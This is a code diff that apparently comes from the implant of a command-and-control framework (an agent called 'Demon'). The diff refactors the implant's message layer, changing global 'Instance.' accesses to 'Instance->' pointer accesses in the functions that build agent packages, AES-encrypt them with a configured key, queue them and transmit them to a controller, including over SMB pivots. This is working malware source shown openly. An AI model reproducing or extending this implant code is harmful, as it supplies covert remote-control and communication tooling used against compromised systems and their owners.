@@ -54,7 +54,7 @@ VOID PackageAddInt32(
         return;
     }
 
-    Package->Buffer = Instance.Win32.LocalReAlloc(
+    Package->Buffer = Instance->Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + sizeof( UINT32 ),
             LMEM_MOVEABLE
@@ -71,7 +71,7 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
         return;
     }
 
-    Package->Buffer = Instance.Win32.LocalReAlloc(
+    Package->Buffer = Instance->Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + sizeof( UINT64 ),
             LMEM_MOVEABLE
@@ -90,7 +90,7 @@ VOID PackageAddBool(
         return;
     }
 
-    Package->Buffer = Instance.Win32.LocalReAlloc(
+    Package->Buffer = Instance->Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + sizeof( UINT32 ),
             LMEM_MOVEABLE
@@ -111,7 +111,7 @@ VOID PackageAddPad( PPACKAGE Package, PCHAR Data, SIZE_T Size )
     if ( ! Package )
         return;
 
-    Package->Buffer = Instance.Win32.LocalReAlloc(
+    Package->Buffer = Instance->Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + Size,
             LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -132,7 +132,7 @@ VOID PackageAddBytes( PPACKAGE Package, PBYTE Data, SIZE_T Size )
 
     if ( Size )
     {
-        Package->Buffer = Instance.Win32.LocalReAlloc(
+        Package->Buffer = Instance->Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + Size,
             LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -158,10 +158,10 @@ PPACKAGE PackageCreate( UINT32 CommandID )
 {
     PPACKAGE Package = NULL;
 
-    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
+    Package            = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
+    Package->Buffer    = Instance->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
     Package->Length    = 0;
-    Package->RequestID = Instance.CurrentRequestID;
+    Package->RequestID = Instance->CurrentRequestID;
     Package->CommandID = CommandID;
     Package->Encrypt   = TRUE;
     Package->Destroy   = TRUE;
@@ -177,7 +177,7 @@ PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
 
     PackageAddInt32( Package, 0 ); // package length
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance.Session.AgentID );
+    PackageAddInt32( Package, Instance->Session.AgentID );
     PackageAddInt32( Package, Package->CommandID );
     PackageAddInt32( Package, Package->RequestID );
 
@@ -196,16 +196,16 @@ PPACKAGE PackageCreateWithRequestID( UINT32 CommandID, UINT32 RequestID )
 VOID PackageDestroy(
     IN PPACKAGE Package
 ) {
-    PPACKAGE Pkg = Instance.Packages;
+    PPACKAGE Pkg = Instance->Packages;
 
     if ( Package )
     {
-        // make sure the package is not on the Instance.Packages list, avoid UAF
+        // make sure the package is not on the Instance->Packages list, avoid UAF
         while ( Pkg )
         {
             if ( Package == Pkg )
             {
-                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance.Packages list" )
+                PUTS_DONT_SEND( "Package can't be destroyed, is on Instance->Packages list" )
                 return;
             }
 
@@ -215,12 +215,12 @@ VOID PackageDestroy(
         if ( Package->Buffer )
         {
             MemSet( Package->Buffer, 0, Package->Length );
-            Instance.Win32.LocalFree( Package->Buffer );
+            Instance->Win32.LocalFree( Package->Buffer );
             Package->Buffer = NULL;
         }
 
         MemSet( Package, 0, sizeof( PACKAGE ) );
-        Instance.Win32.LocalFree( Package );
+        Instance->Win32.LocalFree( Package );
         Package = NULL;
     }
 }
@@ -254,7 +254,7 @@ BOOL PackageTransmitNow(
                 Padding += 32 + 16;
             }
 
-            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
@@ -314,14 +314,14 @@ VOID PackageTransmit(
         }
 #endif
 
-    if ( ! Instance.Packages )
+    if ( ! Instance->Packages )
     {
-        Instance.Packages = Package;
+        Instance->Packages = Package;
     }
     else
     {
         // add the new package to the end of the list (to preserve the order)
-        List = Instance.Packages;
+        List = Instance->Packages;
         while ( List->Next ) {
             List = List->Next;
         }
@@ -338,14 +338,14 @@ BOOL PackageTransmitAll(
     BOOL     Success = FALSE;
     UINT32   Padding = 0;
     PPACKAGE Package = NULL;
-    PPACKAGE Pkg     = Instance.Packages;
+    PPACKAGE Pkg     = Instance->Packages;
     PPACKAGE Entry   = NULL;
     PPACKAGE Prev    = NULL;
 
 #if TRANSPORT_SMB
     // SMB pivots don't need to send DEMON_COMMAND_GET_JOB
     // so if we don't having nothing to send, simply exit
-    if ( ! Instance.Packages )
+    if ( ! Instance->Packages )
         return TRUE;
 #endif
 
@@ -387,7 +387,7 @@ BOOL PackageTransmitAll(
     Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
     // encrypt the package
-    AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
+    AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
     AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
 
     // send it
@@ -400,7 +400,7 @@ BOOL PackageTransmitAll(
     // decrypt the package
     AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
 
-    Entry = Instance.Packages;
+    Entry = Instance->Packages;
     Prev  = NULL;
 
     if ( Success )
@@ -412,17 +412,17 @@ BOOL PackageTransmitAll(
             if ( Entry->Included )
             {
                 // is this the first entry?
-                if ( Entry == Instance.Packages )
+                if ( Entry == Instance->Packages )
                 {
                     // update the start of the list
-                    Instance.Packages = Entry->Next;
+                    Instance->Packages = Entry->Next;
 
                     // remove the entry if required
                     if ( Entry->Destroy ) {
                         PackageDestroy( Entry ); Entry = NULL;
                     }
 
-                    Entry = Instance.Packages;
+                    Entry = Instance->Packages;
                     Prev  = NULL;
                 }
                 else
